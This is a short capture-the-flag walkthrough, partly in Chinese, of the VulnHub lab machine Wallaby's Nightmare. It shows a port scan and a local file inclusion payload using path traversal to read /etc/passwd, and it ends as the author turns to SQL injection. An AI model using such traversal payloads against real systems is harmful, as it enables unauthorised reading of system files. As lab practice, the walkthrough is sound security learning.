# Wallaby's: Nightmare (v1.0.2)

2024-7-x https://www.vulnhub.com/entry/wallabys-nightmare-v102,176/

difficulty: begginer-intermediate

## IP

192.168.10.199

## Scan

Open Port -> 22,80,6667

```
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 6e07fc702098f846e48d2eca3922c7be (RSA)
|   256 994605e7c2bace06c447c84f9f584c86 (ECDSA)
|_  256 4c87714faf1b7c3549ba5826c1dfb84f (ED25519)
80/tcp   open     http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Wallaby's Server
|_http-server-header: Apache/2.4.18 (Ubuntu)
6667/tcp filtered irc
```

先访问 80， 页面底部的 start ctf 存在文件包含， http://192.168.10.199/?page=../../../../../../etc/passwd:

```
root:x:0:0:root:/root:/bin/bash
...
steven?:x:1001:1001::/home/steven?:/bin/bash
ircd:x:1003:1003:,,,:/home/ircd:/bin/bash
<!--This is what we call 'dis-information' in the cyber security world!  Are you learning anything new here 1?-->
```

尝试访问其他文件时, 192.168.10.199/?page=../../../../../../var/log/apache2/access.log 出现提示：

```
buddy.  You must think Wallaby codes like a monkey!  I better get to securing this SQLi though...
(Wallaby caught you trying an LFI, you gotta be sneakier!  Difficulty level has increased.)
```

这时在访问，80 端口已经关闭了。重新扫描，发现端口变成了 60080，应该是 LFI 这里没什么可以利用的地方。看看那个 sqli 吧。
